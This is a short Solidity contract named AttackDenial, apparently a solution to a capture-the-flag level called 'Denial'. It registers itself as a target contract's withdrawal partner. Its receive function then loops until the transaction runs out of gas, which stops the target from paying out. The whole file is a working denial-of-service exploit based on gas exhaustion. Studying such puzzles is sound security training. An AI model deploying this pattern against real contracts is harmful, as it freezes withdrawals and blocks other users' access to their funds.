// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract AttackDenial {
    IDenial public target;

    constructor(IDenial _target) payable {
        target = _target;
    }

    /**
     * @dev Function to set this contract as the withdrawal partner on the target contract
     */
    function setWithdrawPartner() external {
        target.setWithdrawPartner(address(this));
    }

    /**
     * @dev Function to call the withdraw method on the target contract
     */
    function withdraw() external {
        target.withdraw();
    }

    /**
     * @dev A function to receive Ether. It enters a loop to deny further operations 
     * as long as the target has a balance and there's still gas left for the transaction.
     */
    receive() external payable {
        while(address(target).balance > 0 && gasleft() > 0) {}
    }
}
